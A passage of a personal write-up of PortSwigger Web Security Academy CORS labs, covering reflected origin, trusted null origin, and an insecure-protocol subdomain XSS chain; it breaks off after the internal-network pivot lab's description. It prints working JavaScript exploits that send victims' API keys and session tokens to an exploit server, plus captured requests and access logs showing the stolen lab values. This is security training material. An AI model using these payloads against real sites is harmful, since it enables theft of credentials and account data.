# CORS (Cross-Origin Resource Sharing)

## Lab: CORS vulnerability with basic origin reflection

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

The first thing I wanted to do is allow my malicious website access to the victim website data and I did this with the below requesting (adding the origin header).

```
GET /accountDetails HTTP/1.1
Host: 0a6d00880499bce0c15b1885008a0098.web-security-academy.net
Cookie: session=6lxxFD1vansdviCCNt671U5UkFW9pti7
Origin: https://exploit-0a620047043fbc6dc13817cf01ad0011.exploit-server.net
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a6d00880499bce0c15b1885008a0098.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


```


```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://exploit-0a620047043fbc6dc13817cf01ad0011.exploit-server.net
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "jXH9UYXSuAkHwCRR2Q6lXZdIwpnsENOS",
  "sessions": [
    "6lxxFD1vansdviCCNt671U5UkFW9pti7"
  ]
}

```

The above response proves that this is vulnerable because it has allowed access with the `Allow-Control-Allow-Origin` and `Allow-Control-Allow-Credentials` header.


Next I used the following script which makes a request to the `accountDetails` page with the victim cookies which gives us access to the victims api key and sends that back to the exploit-server via the key parameter.

```
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a6d00880499bce0c15b1885008a0098.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='https://exploit-0a620047043fbc6dc13817cf01ad0011.exploit-server.net/log?key='+this.responseText;
};
</script>

```

We confirm this by viewing our access log and viewing the following entry:

```

10.0.4.188      2022-12-23 15:03:53 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22NQmGyvh0XsP0a7E0sKI4Bf2XnMrfcy3n%22,%20%20%22sessions%22:%20[%20%20%20%20%221x6TlltvAUGbqxhmun6jlycJFQ3DeK7g%22%20%20]} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"

```

 which decoded looks like:

 ```
10.0.4.188      2022-12-23 15:03:53  0000 "GET /log?key={  "username": "administrator",  "email": "",  "apikey": "NQmGyvh0XsP0a7E0sKI4Bf2XnMrfcy3n",  "sessions": [    "1x6TlltvAUGbqxhmun6jlycJFQ3DeK7g"  ]} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"


 ```


 ## Lab: CORS vulnerability with trusted null origin

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

```
GET /accountDetails HTTP/1.1
Host: 0aa3004303c16683c10e9e2f004100bb.web-security-academy.net
Cookie: session=EtvZQpXCSSJsP9DkNNEi0bVAZBOYGUKy
Origin: null
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aa3004303c16683c10e9e2f004100bb.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close




```


```

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "ETDoUllEuuE6dO2EEKR1eVCobIo6lx0n",
  "sessions": [
    "EtvZQpXCSSJsP9DkNNEi0bVAZBOYGUKy"
  ]
}

```

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0aa3004303c16683c10e9e2f004100bb.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-0a99003e03d76619c1479d38010c00a2.exploit-server.net/'+this.responseText;
};
</script>"></iframe>

```



```
10.0.3.102      2022-12-23 15:24:38 +0000 "GET //log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%223KleRfFmpMhcZy97YSon5ydTKrSonFit%22,%20%20%22sessions%22:%20[%20%20%20%20%22Tm2A1FhI6vyh8UwC9YQPv21eHa2jxLJR%22%20%20]} HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"

```


```
10.0.3.102      2022-12-23 15:24:38  0000 "GET //log?key={  "username": "administrator",  "email": "",  "apikey": "3KleRfFmpMhcZy97YSon5ydTKrSonFit",  "sessions": [    "Tm2A1FhI6vyh8UwC9YQPv21eHa2jxLJR"  ]} HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"

```

## Lab: CORS vulnerability with trusted insecure protocols

 This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter 


At first looking around the site you can see that there is a subdomain called 

`http://stock.0ad000e30444e60bc113fe86002f000c.web-security-academy.net/?productId=1&storeId=1`


When replacing the productId parameter we can see its reflected:

`https://stock.0ad000e30444e60bc113fe86002f000c.web-security-academy.net/?productId=test&storeId=1`

```
<html>
<head></head>
<body>
<h4>ERROR</h4>
Invalid product ID: test
</body>
</html>
```


We also discovered this is vulnerable to XSS. Using that information we can insert the vulnerable subdomain in the origin which will give the subdomain access to the main domains apikey. We can then exploit the subdomain. While I understood this theoretically I did need a little help with the payload.


```
<script>
    document.location="http://stock.0ad000e30444e60bc113fe86002f000c.web-security-academy.net/?productId=11<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ad000e30444e60bc113fe86002f000c.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0aff00d30408e638c180fd0d01ff0033.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>

```

In our access log we recieved:

```

10.0.4.230      2023-01-11 18:11:38 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22tjthttC8Sn9Zjzh0i8eoGz02912I16Gs%22,%20%20%22sessions%22:%20[%20%20%20%20%22OMyKf4hCiTZkGuwgpCpQ1sIOkrFxCPTg%22%20%20]} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"

```


Which decoded is:


```

10.0.4.230      2023-01-11 18:11:38  0000 "GET /log?key={  "username": "administrator",  "email": "",  "apikey": "tjthttC8Sn9Zjzh0i8eoGz02912I16Gs",  "sessions": [    "OMyKf4hCiTZkGuwgpCpQ1sIOkrFxCPTg"  ]} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"


```


## Lab: CORS vulnerability with internal network pivot attack

This website has an insecure CORS configuration in that it trusts all internal network origins.

This lab requires multiple steps to complete. To solve the lab, craft some JavaScript to locate an endpoint on the local network (192.168.0.0/24, port 8080) that you can then use to identify and create a CORS-based attack to delete a user. The lab is solved when you delete user Carlos.